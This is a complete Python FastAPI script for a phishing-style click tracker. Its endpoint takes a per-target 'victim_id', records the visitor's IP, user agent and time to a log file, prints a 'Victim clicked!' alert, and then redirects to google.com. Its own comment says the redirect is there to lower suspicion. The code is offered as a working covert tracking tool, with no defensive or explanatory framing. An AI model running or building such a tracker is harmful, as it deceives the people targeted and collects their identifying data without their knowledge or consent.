from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse
import json
from datetime import datetime

app = FastAPI()

# A simple file-based database to store hits
LOG_FILE = "victim_logs.json"

@app.get("/track/{victim_id}")
def track_victim(victim_id: str, request: Request):
    # 1. Extract the metadata
    # Check X-Forwarded-For header to handle proxies/load balancers
    forwarded_for = request.headers.get("x-forwarded-for")
    if forwarded_for:
        client_host = forwarded_for.split(",")[0].strip()
    else:
        client_host = request.client.host
    user_agent = request.headers.get("user-agent")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_entry = {
        "victim_id": victim_id,
        "ip": client_host,
        "user_agent": user_agent,
        "timestamp": timestamp
    }

    # 2. Save to log file
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log_entry) + "\n")

    print(f"[*] Alert: Victim {victim_id} clicked! IP: {client_host}")

    # 3. Redirect to a believable destination to lower suspicion
    return RedirectResponse(url="https://www.google.com")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
